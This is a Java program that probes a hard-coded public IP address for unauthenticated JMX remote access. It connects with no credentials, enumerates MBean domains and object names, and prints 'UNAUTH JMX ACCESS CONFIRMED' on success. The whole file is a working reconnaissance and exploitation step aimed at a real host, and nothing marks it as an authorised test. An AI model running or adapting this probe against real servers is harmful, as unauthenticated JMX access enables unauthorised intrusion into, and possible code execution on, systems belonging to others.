import javax.management.remote.*;
import javax.management.*;
import java.util.*;
public class JmxConnect2 {
  public static void main(String[] a) throws Exception {
    String[] urls = {
      "service:jmx:rmi:///jndi/rmi://160.202.130.243:8085/jmxrmi",
      "service:jmx:rmi://160.202.130.243:8084/jndi/rmi://160.202.130.243:8085/jmxrmi",
    };
    for (String url : urls) {
      System.out.println("=== " + url + " ===");
      try {
        JMXServiceURL u = new JMXServiceURL(url);
        Map<String,Object> env = new HashMap<>();
        JMXConnector c = JMXConnectorFactory.connect(u, env);
        MBeanServerConnection mbsc = c.getMBeanServerConnection();
        String[] domains = mbsc.getDomains();
        System.out.println("  CONNECTED. Domains: " + Arrays.toString(domains));
        int n = mbsc.getMBeanCount();
        System.out.println("  MBean count: " + n);
        Set<ObjectName> beans = mbsc.queryNames(null, null);
        int cnt=0;
        for (ObjectName on : beans) { cnt++; if(cnt<=30) System.out.println("    " + on); }
        System.out.println("  >>> UNAUTH JMX ACCESS CONFIRMED <<<");
        c.close();
        return;
      } catch (Exception e) {
        System.out.println("  ERR: " + e.getClass().getSimpleName() + ": " + e.getMessage());
      }
    }
  }
}
